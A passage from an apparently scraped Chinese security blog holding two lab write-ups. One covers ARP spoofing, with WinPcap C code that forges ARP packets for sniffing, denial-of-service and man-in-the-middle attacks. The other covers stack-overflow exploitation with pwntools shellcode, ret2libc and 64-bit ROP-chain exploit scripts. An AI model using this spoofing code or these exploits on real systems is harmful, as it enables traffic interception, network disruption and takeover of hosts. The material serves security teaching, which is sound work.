攻击机IP(192.168.195.131)的MAC地址。\n相应的，目标靶机(IP192.168.195.138) 的ARP表 中对应 主机(IP192.168.195.1)的MAC地址也被篡改为攻击机IP(192.168.195.131)的MAC地址。\n以上就是 中间人攻击之后的 效果。\n下面利用wireshark进行抓包，分析ARP数据包的流程。\n抓获到两个arp数据包\n第一个arp数据包\n源MAC 被设置为 攻击机的MAC 地址 :00-0c-29-06-65-c9 源IP 为靶机 的IP : 192.168.195.138 目的 MAC 和 目的 IP 均指向正确的 主机win10 的 IP 和地址 由此主机win10 中 的arp表，指向目标靶机(IP192.168.195.138)的mac地址被篡改为 攻击机(IP : 192.168.195.138)的MAC地址，因此主机win10发送给靶机的数据 均因为mac地址被发送到 攻击机上面。 第二个arp数据包\n源MAC 被设置为 攻击机的MAC 地址 :00-0c-29-06-65-c9 源IP 为靶机 的IP : 192.168.195.1 目的 MAC 和 目的 IP 均指向正确的 靶机 win xp 的 IP 和地址 由此靶机 win xp 中 的arp表，指向主机(IP192.168.195.1)的mac地址被篡改为 攻击机(IP : 192.168.195.138)的MAC地址，因此同样靶机win xp 发给 主机win 10 的数据流也会被先发给 攻击机。 总而言之，中间人攻击即为\n攻击者向目标发送虚假应答包，告诉主机A“主机B的MAC地址是MacC（攻击者MAC）”，告诉主机B“主机A的MAC地址是MacC（攻击者MAC）”\n成功后，主机A发送给主机B的数据包被转发给主机C，主机B发送给主机A的数据包也被转发给主机C，\n于是A、B之间的数据均被C嗅探。攻击者C会转发重定向到自己的数据包到正确位置，因此A和B没有察觉到嗅探的存在。\n0x04 基于Winpcap 对指定目标IP进行ARP欺骗攻击 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 #define WIN32 #define HAVE_REMOTE #include\u0026lt;stdio.h\u0026gt; typedef unsigned char u_char; typedef unsigned short u_short; typedef unsigned int u_int; #include \u0026lt;pcap.h\u0026gt; #define ETH_ARP 0x0806 //以太网帧类型表示后面数据的类型，对于ARP请求或应答来说，该字段的值为x0806 #define ARP_HARDWARE 1 //硬件类型字段值为表示以太网地址 #define ETH_IP 0x0800 //协议类型字段表示要映射的协议地址类型值为x0800表示IP地址 #define ARP_REQUEST 1 //ARP请求 #define ARP_RESPONSE 2 //ARP应答 //14字节以太网首部 struct EthernetHeader { u_char DestMAC[6]; //目的MAC地址 6字节 u_char SourMAC[6]; //源MAC地址 6字节 u_short EthType; //上一层协议类型，如0x0800代表上一层是IP协议，0x0806为arp 2字节 }; //28字节ARP帧结构 struct ArpHeader { unsigned short hdType; //硬件类型 unsigned short proType; //协议类型 unsigned char hdSize; //硬件地址长度 unsigned char proSize; //协议地址长度 unsigned short op; //操作类型，ARP请求（1），ARP应答（2），RARP请求（3），RARP应答（4）。 u_char smac[6]; //源MAC地址 u_char sip[4]; //源IP地址 u_char dmac[6]; //目的MAC地址 u_char dip[4]; //目的IP地址 }; //定义整个arp报文包，总长度42字节 struct ArpPacket { struct EthernetHeader ed; struct ArpHeader ah; }; int main() { pcap_if_t* alldevs; //所有网络适配器 pcap_if_t* d; //选中的网络适配器 int inum; //选择网络适配器 int i = 0; //for循环变量 pcap_t* adhandle; //打开网络适配器，捕捉实例,是pcap_open返回的对象 char errbuf[PCAP_ERRBUF_SIZE]; //错误缓冲区,大小为256 /* 获取本机设备列表 */ // 获取本机相关的所有网关 if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, \u0026amp;alldevs, errbuf) == -1) { fprintf(stderr, \u0026#34;Error in pcap_findalldevs: %s\\n\u0026#34;, errbuf); exit(1); } /* 打印网关列表 */ for (d = alldevs; d; d = d-\u0026gt;next) { printf(\u0026#34;%d. %s\u0026#34;, ++i, d-\u0026gt;name); if (d-\u0026gt;description) printf(\u0026#34; (%s)\\n\u0026#34;, d-\u0026gt;description); else printf(\u0026#34; (No description available)\\n\u0026#34;); } // 如果 i = 0 ，说明该计算机没有网关 if (i == 0) { printf(\u0026#34;\\nNo interfaces found! Make sure WinPcap is installed.\\n\u0026#34;); return -1; } // 选择合适的网关 printf(\u0026#34;Enter the interface number (1-%d):\u0026#34;, i); scanf(\u0026#34;%d\u0026#34;, \u0026amp;inum); if (inum \u0026lt; 1 || inum \u0026gt; i) { printf(\u0026#34;\\nInterface number out of range.\\n\u0026#34;); /* 释放设备列表 */ pcap_freealldevs(alldevs); return -1; } /* 跳转到选中的适配器 */ for (d = alldevs, i = 0; i \u0026lt; inum - 1; d = d-\u0026gt;next, i++); /* 打开设备 */ if ((adhandle = pcap_open(d-\u0026gt;name, // 设备名 65536, // 65535保证能捕获到不同数据链路层上的每个数据包的全部内容 PCAP_OPENFLAG_PROMISCUOUS, // 混杂模式 1000, // 读取超时时间 NULL, // 远程机器验证 errbuf // 错误缓冲池 )) == NULL) { fprintf(stderr, \u0026#34;\\nUnable to open the adapter. %s is not supported by WinPcap\\n\u0026#34;, d-\u0026gt;name); /* 释放设备列表 */ pcap_freealldevs(alldevs); return -1; } /*以上代码在WinPcap开发文档中都可以找到，填充ARP包的代码则要自己编写*/ //开始填充ARP包，填充数据写死在代码中，测试用时数据可随意填写 unsigned char sendbuf[42]; //arp包结构大小，42个字节 unsigned char mac[6] = { 0x01,0x01,0x01,0x01,0x01,0x01 }; //unsigned char mac[6] = { 0xff,0xff,0xff,0xff,0xff,0xff }; unsigned char ip[4] = { 192,168,195,138 }; unsigned char dmac[6] = {0x00,0x50,0x56,0xe7,0xd4,0x22}; unsigned char d_ip[4] = {192,168,195,2}; struct EthernetHeader eh; struct ArpHeader ah; //赋值MAC地址 //memset(eh.DestMAC, 0xff, 6); //以太网首部目的MAC地址，全为广播地址 memcpy(eh.DestMAC, dmac, 6); //以太网首部目的MAC地址 memcpy(eh.SourMAC, mac, 6); //以太网首部源MAC地址 memcpy(ah.smac, mac, 6); //ARP字段源MAC地址 //memset(ah.dmac, 0xff, 6); //ARP字段目的MAC地址 memcpy(ah.dmac, dmac, 6); //ARP字段目的MAC地址 memcpy(ah.sip, ip, 4); //ARP字段源IP地址 memset(ah.dip, 0x05, 4); //ARP字段目的IP地址 memcpy(ah.dip, d_ip, 4); //ARP字段目的IP地址 eh.EthType = htons(ETH_ARP); //htons：将主机的无符号短整形数转换成网络字节顺序 ah.hdType = htons(ARP_HARDWARE); ah.proType = htons(ETH_IP); ah.hdSize = 6; ah.proSize = 4; ah.op = htons(ARP_REQUEST); //构造一个ARP请求 memset(sendbuf, 0, sizeof(sendbuf)); //ARP清零 memcpy(sendbuf, \u0026amp;eh, sizeof(eh)); memcpy(sendbuf + sizeof(eh), \u0026amp;ah, sizeof(ah)); //如果发送成功 if (pcap_sendpacket(adhandle, sendbuf, 42) == 0) { printf(\u0026#34;\\nPacketSend succeed\\n\u0026#34;); } else { printf(\u0026#34;PacketSendPacket in getmine Error: %d\\n\u0026#34;, GetLastError()); } /* 释放设备列表 */ pcap_freealldevs(alldevs); return 0; } 广播攻击 构造响应包，其中协议地址为网关IP，而MAC地址为广播地址，将这样的响应包发给局域网内主机。那么，局域网主机发给网关的数据包都将被广播。这既是一种嗅探方法，也可作为干扰网络服务的攻击方法。\n这里将靶机(192.168.195.138)对网关的MAC 地址篡改为 广播地址，利用攻击机(IP : 192.168.195.131)监控流量。\n在发包的源代码中：修改 IP和 MAC地址，构造ARP包\n1 2 3 4 5 6 7 源ip mac (这里是网关的IP地址 和 广播mac地址) unsigned char mac[6] = { 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF }; unsigned char ip[4] = { 192,168,195,2 }; 目的 ip mac (这里是 靶机的IP和MAC) unsigned char dmac[6] = {0x00,0x0C,0x29,0x19,0xba,0x6e}; unsigned char d_ip[4] = {192,168,195,138}; 这里的第一个arp -a 显示的 网关mac地址 为正确的 mac地址。\n第二个 arp -a 为 发送虚假构造的arp包 之后，网关地址被修改为 广播地址。\n然后用靶机(IP 192.168.195.138) ping win10主机 ，同时在攻击机(IP 192.168.195.131) 中用wireshark进行监控信道，进行抓包\n可以发现攻击机可以监控到 靶机(IP 192.168.195.138) ping www.baidu.com 的数据包\n对此ICMP 包，进行分析，可以看到发包的mac地址确实为 广播地址 FF-FF-FF-FF-FF-FF 拒绝服务攻击 构造虚假响应包，其中协议地址为关键服务的IP地址，例如网关，而MAC地址为不存在的虚假地址，将这样的响应包发给局域网内主机。那么，局域网主机发给关键服务（如网关）的数据包都将丢失，从而形成拒绝服务攻击。\n构造ARP数据包\n1 2 3 4 5 6 将arp包 发送源mac修改为虚假 的 mac地址 unsigned char mac[6] = { 0x01,0x01,0x01,0x01,0x01,0x01 }; unsigned char ip[4] = { 192,168,195,2 }; unsigned char dmac[6] = {0x00,0x0C,0x29,0x19,0xba,0x6e}; unsigned char d_ip[4] = {192,168,195,138}; 在 发送arp数据包前\n可以看到 arp 表 对应的mac 地址 正确，并且网页可以正常打开。 发送 arp 包\n查看靶机的 arp 表 和 上网状态。 可以看到 网关的 mac 地址 被篡改为 01-01-01-01-01-01 ，同时也无法访问百度了。 中间人攻击 这里设计思路与利用WinArpAttacker 进行中间人攻击一样。\n将靶机winxp(IP 192.168.195.138) 和 主机 win10 (IP 192.168.195.1) 之间的mac均篡改为 攻击机 (IP 192.168.195.131)的mac地址。\n这里需要构造两个arp请求包\n对于靶机 win xp\n1 2 3 4 5 unsigned char mac[6] = { 0x00,0x0c,0x29,0x06,0x65,0xc9 }; unsigned char ip[4] = { 192,168,195,1}; unsigned char dmac[6] = {0x00,0x0C,0x29,0x19,0xba,0x6e}; unsigned char d_ip[4] = {192,168,195,138}; 对于靶机 win 10\n1 2 3 4 5 unsigned char mac[6] = { 0x00,0x0c,0x29,0x06,0x65,0xc9 }; unsigned char ip[4] = { 192,168,195,1}; unsigned char mac[6] = { 0x00,0x50,0x56,0xc0,0x00,0x08 }; unsigned char d_ip[4] = {192,168,195,1}; 查看未构造包前的状态\n此时两个靶机之间对应的mac 均为正确的。 发送两个arp 请求包。\n发送完成 查看发送后的 mac 对应表\n可以很直观的看到，两个靶机之间的mac地址均被篡改为 攻击机的 ip地址。 这里用win10 ping 通 靶机 win xp,同时在攻击机用 wireshark进行抓包。\n可以看到信息被攻击机截获，并且mac地址被篡改为 攻击机的 mac地址 ， 攻击机只需要将mac地址修改一下即可实现中间人攻击。 0x05 结论 ARP实验过程中，发送的数据包过少，计算机系统自身会迅速发出arp广播包 来恢复正确的mac地址，实验过程迅速的完成。长期的攻击需要不间断的发送arp请求包。 arp欺骗攻击的原理通过抓包来理解的透彻。 vm虚拟机利用nat桥接模式可以实现，主机和虚拟机在同一局域网下，使用vm8的虚拟网卡，以此作为实验的基础。 ","permalink":"http://www.reus09.top/posts/tech/arp%E6%AC%BA%E9%AA%97/","summary":"ARP欺骗实验 0x01 实验前提知识 ARP协议的安全问题 ARP协议是建立在信任局域网内所有结点的基础上的，它高效，但却不安全。 ARP高速缓存根据所接","title":"Arp欺骗"},{"content":"pwn_rop 调试 0x01 实验目的 1.针对实验一，通过gdb调试rop1，确定shellcode的地址；此外，通过rop1.py的调试脚本确定shellcode地址；最终拿到shell权限。相关详细分析过程写入报告，并比较两种方法的特点。 2.针对实验二的32位环境和64位环境，通过调试分析，完成实际rop2.py和rop3.py （预留有空白和错误之处），最终拿到shell权限。相关详细分析过程写入报告 0x02 实验环境 Ubuntu 20 gcc 版本 工具 pwndbg ROPgadget pwntools visual studio code 通过vs code 的ssh 远程连接服务器ubuntu，并且远程调试程序。 0x03 实验前提知识 ROP的全称为 Return-oriented Programming（返回导向编程\n绕过可执行空间保护、代码签名等安全保护机制，执行恶意代码 通过控制被调用的堆栈，对程序的控制流进行劫持，完成某些特定功能 Shellcode写在栈中 未提供堆栈的保护措施，直接将shellcode写入栈中，并将函数的返回地址覆写为shellcode的地址。\n返回地址覆盖为shellcode，从而实现执行shellcode。 Ret2libc 加入了DEP（Data Execution Prevention）和NX（No execute）保护之后，拒绝执行堆栈上的任何代码。 ret2libc是ROP技术的一种，通过将返回地址覆写为libc中的函数绕过NX保护。 我们知道，操作系统通常使用动态链接的方法来提高程序运行的效率。那么在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载。也就是控制执行 libc（对应版本） 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)（或者execve(\u0026quot;/bin/sh\u0026quot;,NULL,NULL)），故而此时我们需要知道 system 函数的地址。 gadget 64位处理器的发展，改变了函数的调用约定，要求函数的前6个参数保存在寄存器中，如果还有更多的参数才会保存在栈中。 想继续给函数传递参数,将不能通过简单操作栈来操作函数，还需要操作寄存器。由此ret2libc变的难以成功。 gadget是从可执行文件或共享库中获取的以ret为结尾的指令序列。这种ROP技术寻找能够将栈中的值pop到寄存器的指令片段，由此构造函数参数。 ASLR地址随机化 开启地址随机化\n1 2 3 4 5 # 查看ASLR是否开启 cat /proc/sys/kernel/randomize_va_space # 关闭ASLR sudo su echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space 系统转储 dump core 1 2 3 4 5 6 7 # 查看是否开启： ulimit -c （如果是0就是关着的） # 开启转储 ulimit -c unlimited # 设置转储文件位置为/tmp文件夹下面 sudo su sudo sh -c \u0026#39;echo \u0026#34;/tmp/core.%t\u0026#34; \u0026gt; /proc/sys/kernel/core_pattern\u0026#39; Ubuntu 保持堆栈平衡 在Ubuntu18以上的版本，64位的程序若包含了system（“/bin/sh”），就需要考虑堆栈平衡。因为在Ubuntu18下system调用时要求地址和16字节对齐，如果没有栈对齐的话，程序就直接crash了。\n因为命令:\n1 2 3 .text:000000000004F2F1 movhps xmm0, [rsp+198h+var_190] .text:000000000004F2F6 movaps [rsp+198h+var_158], xmm0 ; here .text:000000000004F2FB call sigaction 主要原因是0x4F2F6处的movaps [rsp+198h+var_158], xmm0指令要求rsp+198h+var_158的值是对齐16byte（0x10），否则会直接触发中断从而crash。\n这些都是在Ubuntu 18 版本以上的才存在。\n栈的字节对齐，实际是指栈顶指针必须是16字节的整数倍。栈对齐使得在尽可能少的内存访问周期内读取数据，不对齐堆栈指针可能导致严重的性能下降。\n但是实际上，即使数据没有对齐，我们的程序也是可以执行的，只是效率有点低而已，但是某些型号的Intel和AMD处理器，在执行某些实现多媒体操作的SSE指令时，如果数据没有对齐，将无法正确执行。这些指令对16字节内存进行操作，在SSE单元和内存之间传送数据的指令要求内存地址必须是16的倍数。\n因此，任何针对x86_64处理器的编译器和运行时系统都必须保证， 它们分配内存将来可能会被SSE指令使用，所以必须是16字节对齐的，这也就形成了一种标准：\n任何内存分配函数（alloca, malloc, calloc或realloc）生成的块的起始地址都必须是16的倍数。 大多数函数的栈帧的边界都必须是16字节的倍数。 如上，在运行时栈中，不仅传递的参数和局部变量要满足字节对齐，我们的栈指针（rsp）也必须是16的倍数。\n实验源码 1 2 3 4 5 6 7 8 9 10 11 12 13 #include\u0026lt;stdio.h\u0026gt; void vuln() { char buf[128]; read(0,buf,256); } int main() { vuln(); write(1,\u0026#34;hello rop\\n\u0026#34;,10); } 分析程序漏洞 Vuln()函数中，buf数组的大小是128字节，但是在read时最多可以读入256字节，容易造成缓冲区溢出，利用这个漏洞对程序流进行劫持，执行构造好的payload。 具体的思路：把payload写入buf数组中，并利用缓冲区溢出漏洞，将返回地址修改为buf数组的地址，vuln()函数返回之后，就会到buf数组中执行shellcode 可以利用pwntools有一个shellcraft模块可以实现shellcde，其中其中**shellcraft.sh()**就是生成执行/bin/sh的shellcode。\n可以用asm()将shellcode 转换为机器码\n0x04 实验过程 rop1_gdb 编译rop1.c，关闭栈保护和NX保护，在32位环境下，编译生成rop1 这里我们想实现的是通过gdb 调试rop1获得真正的buf地址，然后向里面输入我们精心构造好的shellcode,将返回地址覆盖为我们找到的真实buf地址。\n这里解释一下为什么gdb调试中产生的buf地址和真正执行程序的地址原因\n正常程序运行时，会将环境变量字符串数组和命令行参数字符串数组存放在栈顶，而程序使用的局部变量等数据则位于这些字符串数组之后。环境变量字符串数组记录了诸如当前用户名、终端类型、搜索路径等环境信息。程序直接运行时，程序进程继承的是运行其的 shell 的环境变量，而程序通过 gdb 运行时，程序进程继承的是 gdb 的环境变量，这两者存在不同，从而会造成位于栈上的局部变量的地址发生改变。用户可在 gdb 中运行 show environment 命令获得环境变量参数。、\n较之程序直接运行，位于栈顶的环境变量主要有以下变化\n环境变量的内容发生改变，在程序直接运行时，_ 变量存放的是程序的执行路径，而通过 gdb 运行程序时，_ 变量存放的是 gdb 的执行路径。 通过 gdb 运行的调试程序继承了 gdb 的环境变量，其中包含新加入的环境变量 LINES 和 COLUMNS。 位于栈上的参数列表也可能不同，当用户通过 ./rop1 直接在shell 中运行程序时，位于参数数组的第一项 argv[0] 内容为”./rop1” ,而用户通过 gdb 运行 hello 程序时，程序的参数列表的第一项 argv[0] 的值为该程序的绝对路径”/home/reus09/test/pwn/2_rop/rop1”，这也会造成程序运行时局部变量地址的差异。建议终端环境下使用绝对路径运行程序，避免该差异。 这里有三种解决方案\n通过gdb来attach 一个正在运行的程序，其地址和正在运行的地址是一致的\n在gdb调试过程中，对传递给进程的环境变量进行操作和修改\ngdb 可通过 wrapper 函数运行调试程序。当设置好 wrapper 程序后，gdb 会以 exec wrapper hello 的 shell 命令的形式启动调试程序 Hello，wrapper程序首先运行并最终启动调试进程，之后由 gdb 对调试进程进行控制。通过 wrapper 程序，即可控制传递给调试进程的环境变量。\n1 2 3 set exec-wrapper wrapper　//设置 wrapper 程序为 wrapper show exec-wrapper //显示当前的 wrapper 程序 unset exec-wrapper　//取消对 wrapper 程序的设置 利用内核转储获取真实地址。\n使用命令ulimit -c unlimited启动内核转储，缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。 然后使用命令gdb filename core即可调试，获得真实地址。 第一种方案 通过gdb来attach 一个正在运行的程序 运行rop1程序 利用ps -ax 查看所有进程，发现rop1运行的进程pid 为 130896，将其直接attach 在vuln地方设置断点，并且执行程序，进入到vuln函数里面 一路n 单步步过，跳到read函数上面 发现buf地址为0xffffd1a0，此时的buf地址即为真实地址 第二种方案 gdb调试过程中，去除环境变量\n输入命令gdb rop1\n1 set exec-wrapper env -u COLUMNS -u LINES -u _ //在 gdb 中设置 wrapper 程序 然后在vuln处设置断点，运行程序后，单步跳过一直到read部分\n发现此时的buf首地址仍然为 0xffffd1a0\nshellcode 执行部分 上述两种方案确定了直接执行rop1程序的时候buf的真正首地址0xffffd1a0\n但是由于pwntools 自带的 python环境，会影响rop1程序运行的buf地址，因此这个真实地址是不能够在shellcode中直接作为返回地址执行的。\n因为这里需要用gdb来实现shellcode 的调试，所以我们需要加入gdb的环境，并设置一些软断点来保证gdb中可以执行到shellcode\n这里需要用到core报错的部分，同样我们也需要管道来输入我们精心构造好的shellcode\n这里我们需要确定一下buf数组的长度，以及返回长度的位数，以便于确定找到返回地址从而覆盖掉它。\n这里我们采用在IDA里面查看一下我们需要填充多少字符\nIDA查看buf数组的存储情况 由此确定buf首地址到esp 的长度为 0x88,然后到返回地址的长度为0x04,因此算上我们构造的shellcode，我们需要填充0x8c个字符 然后我们这里以一个错误的地址0xdeadbeef来产生报错，从而得到在gdb中buf的可用地址\n我们通过pwntools产生shellcode将其保存为deadbeef，其最后的地址会被覆盖为0xdeadbeef\n脚本如下\n1 2 3 4 5 6 7 8 9 from pwn import * p = process(\u0026#39;./rop1\u0026#39;) shellcode = asm(shellcraft.sh()) shellcode_addr = 0xdeadbeef payload = shellcode.ljust(0x8c,b\u0026#39;a\u0026#39;)+p32(shellcode_addr) print(payload) with open(\u0026#34;deadbeef\u0026#34;,\u0026#39;wb\u0026#39;) as f: f.write(payload) 可以看到我们精心构造的shellcode已经存储到文件deadbeef里面\n在gdb 中调试\n命令r \u0026lt; deadbeef，执行过程中通过管道输入我们构造好的shellcode 发现寄存器ECX存储的是shellcode存储的首地址 此地址0xffffd170即为我们gdb调试过程中可以利用的buf真实地址 下面利用上面同样的方法，构造好我们需要的产生shellcode的文件\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * p = process(\u0026#39;./rop1\u0026#39;) shellcode = asm(shellcraft.sh()) shellcode_addr = 0xffffd170 payload = shellcode.ljust(0x8c,b\u0026#39;a\u0026#39;)+p32(shellcode_addr) print(payload) with open(\u0026#34;gdb_with_payload\u0026#34;,\u0026#39;wb\u0026#39;) as f: f.write(payload) 我们可以利用的shellcode文件即已经构造完成。\n下面在gdb中执行我们的shellcode\n这里需要做一些前置工作，因为我们想要设置一些软断点。否则输入shellcode后进程会被直接杀死，程序只会一闪而过。\n这个软断点的意思是，跟踪我们输入的文件，文件输入完毕后，设置断点\n命令如下\n1 2 3 4 5 set detach-on-fork on set follow-fork-mode child set breakpoint pending on b_start 首先告诉 gdb 跟踪子进程；然后设置set breakpoint pending on是为了在设置断点时让 gdb 不强制在对符号下断点时就需要固定地址，这样在b _start时就会 pending 而不是报错；最后再连接到父进程以及加载子进程的符号。 直接gdb rop1进入命令，然后输入上述设置子进程的命令\n然后输入命令r \u0026lt; gdb_with_payload，执行的时候通过管道符载入数据gdb_with_payload，这里覆盖返回地址的是我们精心构造的适合gdb环境的buf地址(注意，这里的buf地址并不是程序直接运行产生的buf地址) 连续的r命令 这里通过一个子进程的调度从而运行了我们的shellcode，很明显可以看到这里出现了我们的输入命令 验证是否拿到shell\n输入命令ls 输入命令whoami 这样我们就实现了通过gdb调试直接 控制shell，但是由于设置断点的子进程输入命令后，直接被附近到当前的命令，故每次调试只能使用一次。\nrop1_py 这里是使用pwntools工具来实现拿到shell,pwntools实现的连接持久，这里同样也是我们上述提到的第三种方案利用内核转储获取真实地址(即利用 dump core 来实现获取buf地址，这个buf地址是受python环境影响的)\n首先构造虚假的地址0xdeadbeef来使程序崩溃产生core\n脚本如下\n1 2 3 4 5 6 7 from pwn import * p = process(\u0026#39;./rop1\u0026#39;) shellcode = asm(shellcraft.sh()) shellcode_addr = 0xdeadbeef payload = shellcode.ljust(0x8c,b\u0026#39;a\u0026#39;)+p32(shellcode_addr) p.sendline(payload) p.interactive() 在终端执行该脚本\n通过前后ls命令可以很清晰的看到，执行脚本之后程序崩溃，产生了core报错文件 执行命令gdb ./rop1 core来调试该core\n此时esp指针位于返回地址的下一个位置，因此buf的地址是esp-0x4-0x8c，即地址esp-0x90 通过命令x/s $esp-0x90查看 发现地址0xffffd1c0存储的果然是shellcode存放的地方 于是直接将返回地址修改为0xffffd1c0\n在终端执行exp\n可以看到，我们已经拿到了shell 最终exp 如下\n1 2 3 4 5 6 7 from pwn import * p = process(\u0026#39;./rop1\u0026#39;) shellcode = asm(shellcraft.sh()) shellcode_addr = 0xdeadbeef payload = shellcode.ljust(0x8c,b\u0026#39;a\u0026#39;)+p32(shellcode_addr) p.sendline(payload) p.interactive() rop2_32 编译rop1.c，只开启Canary栈保护，在32位环境下，编译生成rop2 可以看到NX保护已经开启，程序为32位程序 查看rop2进程栈的权限为rw-p，不可执行 栈上的程序不能运行，即我们不能在栈上执行shellcode，但在程序中用到了libc库中的read和printf函数，libc.so中保存了大量的可用函数，考虑调用system(\u0026quot;/bin/sh\u0026quot;)来绕过NX保护获取shell\n根据ROP的原理，不难发现，我们可以将返回地址覆盖为我们要调用的system函数地址，然后在它下面写入system函数需要返回的地址以及它传入的参数/bin/sh\n示意图如下 这里首先确定一下buf首地址到返回地址中间的差距，以便确定填充多少字符来覆盖返回地址。\n同样用IDA 查看 rop2 中 buf的结构 发现需要填充的字符为0x88 + 0x04 为 0x8c 因为我们环境已经关闭了地址随机化，因此system和/bin/sh的地址并不会随程序运行而改变。\n接下来寻找system的地址\n我们可以在gdb 调试过程中 直接 调用命令print system 来查看system函数地址 因此system函数地址为0xf7e17830 接下来需要我们需要的字符串/bin/sh的存储地址\n这里我们需要调试gdb过程中，用到vmmap 命令来查看libc.so的起始位置，在其中间查找到存储/bin/sh的地址 根据起始地址和结束地址，查找/bin/sh的位置 显然/bin/sh存放的地址为0xf7f64352 我们调用system后的返回地址因为我们不需要返回，所以直接填充0xdeadbeef即可\n在终端下调用exp\n很明显可以看到我们已经拿到了shell 最终exp:\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * p = process(\u0026#39;./rop2\u0026#39;) #gdb.attach(p,\u0026#39;b vuln\u0026#39;) sys_addr=0xf7e17830 binsh_addr=0xf7f64352 payload = b\u0026#39;a\u0026#39;*0x8c + p32(sys_addr)+p32(0xdeadbeef)+p32(binsh_addr) p.sendline(payload) p.interactive() rop3_64 编译rop1.c，只开启Canary栈保护，关闭no-pie在64位环境下，编译生成rop3 这里同样关闭了NX保护,同时编译产生的程序为64位 并不能在栈上直接写shellcode，考虑同样构造ROP链的形式来拿到shell，但是64位程序不同于32位程序，参数存放在寄存器中，多于6个参数才会放在栈上。\n图例\n关于漏洞利用\n由于参数不会直接放在栈上，需要寻找类似于pop rdi；ret的gadget，将参数从栈中弹出到rdi寄存器后，返回到返回地址处继续执行。本例子在栈中事先压入参数/bin/sh地址和system地址。 图例即为 ubuntu20 字节对齐 首先查看一下要从buf数组到返回地址 我们需要覆盖多少字节\n这里同样使用IDA来查看程序 发现buf数组长度为0x80，返回地址长度为0x08，故我们需要覆盖的长度为0x88 找到存在pop rdi;ret的指令地址\n这里使用ROPgadget 工具 首先使用命令ldd rop3查看rop3使用的libc的版本，找到对应的版本，然后就在libc库中查到我们需要的pop rdi;ret 这里我们就拿到了pop|rdi 相对于libc的偏移地址0x0000000000026b72 找到system和/bin/sh的地址\n这里的方法和找rop2中的方法一样\n在gdb调试过程中，分别用print system 和vmmap 查找地址\n可以看到system的存储地址为0x7ffff7e22410\nvmmap 和find命令查找/bin/sh地址\n可以看到/bin/sh的地址为0x7ffff7f845aa\n/usr/lib/x86_64-linux-gnu/libc-2.31.so的起始地址为0x7ffff7dcd000\n按道理这个时候我们已经将地址一一对应填入即可拿到shellcode，但是由于我们机器使用的为ubuntu 20,在ubuntu18版本以上的系统，64位的程序若包含了system（“/bin/sh”），就需要考虑堆栈平衡。因为在Ubuntu18下system调用时要求地址和16字节对齐，如果没有栈对齐的话，程序就直接crash了。\n我们这里填充的字符长度为0x88，因此我们需要在加入0x08个字符来平衡栈，这种情况下如加入新的字节不能影响我们ROP链的执行，因此我们该字符存储因改为ret指令类似的不影响逻辑的指令。\n我们同样根据ROPgadget来拿到对应的ret存放的地址\n我们直接查看位于libc.so中的程序中一个存储ret指令的地址\n命令 ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only \u0026quot;ret\u0026quot;\n因为这里相对偏移基于libc.so的首地址为0x0000000000025679\n所以ret的实际地址为0x7ffff7dcd000+0x0000000000025679\n将填充好的地址 写入exp中，在终端执行exp\n最终exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * p = process(\u0026#39;./rop3\u0026#39;) ret_addr= 0x7ffff7dcd000+0x0000000000025679 sys_addr= 0x7ffff7e22410 binsh_addr=0x7ffff7f845aa pr_addr = 0x7ffff7dcd000 + 0x26b72 payload = b\u0026#39;a\u0026#39;*0x88+ p64(ret_addr)+ p64(pr_addr)+p64(binsh_addr)+p64(sys_addr)+p64(0xdeadbeef) p.sendline(payload) p.interactive() Ubuntu16 中正常没有字节对齐 ubuntu版本\n找到存在pop rdi;ret的指令地址\n相对偏移地址为0x0000000000021112 system地址\nsystem 地址为 0x7ffff7a523a0 /bin/sh地址\nlibc.so首地址0x7ffff7a0d000,/bin/sh首地址0x7ffff7b99e57 exp终端直接执行\n发现拿到shell 最终exp\n1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * p = process(\u0026#39;./rop3\u0026#39;) sys_addr= 0x7ffff7a523a0 binsh_addr=0x7ffff7b99e57 pr_addr = 0x7ffff7a0d000 + 0x21112 payload = \u0026#39;a\u0026#39;*0x88 + p64(pr_addr)+p64(binsh_addr)+p64(sys_addr)+p64(0xdeadbeef) p.sendline(payload) p.interactive() 0x05 实验结论 实验过程中针对实验一，分别使用了gdb直接调试得到shell和通过pwntools结合dump core得到shell两种方案，但是实际上两种方案中运用的地址并不是程序直接运行时候buf数组的地址，二者因为程序运行环境的差异，buf的地址都有差异。 同时呢，运用gdb调试shellcode，直接写入数据比较麻烦，因为shellcode读取需要字节流，这里的解决方案是利用pwntools生成的payload保存为文件，以管道的形式将其输入到gdb中。此外，在查看shellcode调试效果的时候，需要设置软断点来调用子进程，并且一次只能查看一个命令的结果，不便于持久化shell连接，但是gdb方便调试，随意设置断点，查看自己想看的东西，定位到read函数里面查看buf的地址，很方便。 python 调试呢，因为结合程序运行崩溃产生的core,在python环境下的buf地址相当明朗，借助pwntools的工具，很容易就可以构造payload，将其发送给服务器端并建立持久化的shell连接，但是调试的话不太方便，但是可以使用在pwntools里面调用gdb来实现。所以总体来说，rop1-modified.py脚本调试更为方便，功能也更为强大。 对于实验二 对于Ubuntu18 以上的版本，调试64位程序的时候，我们精心构造的payload一般要考虑字节对齐的因素，一般采用ret来进行对齐。 充分理解了ROP链的构造过程 了解了Linux下system和exec函数的用法。 ","permalink":"http://www.reus09.top/posts/tech/rop/","summary":"pwn_rop 调试 0x01 实验目的 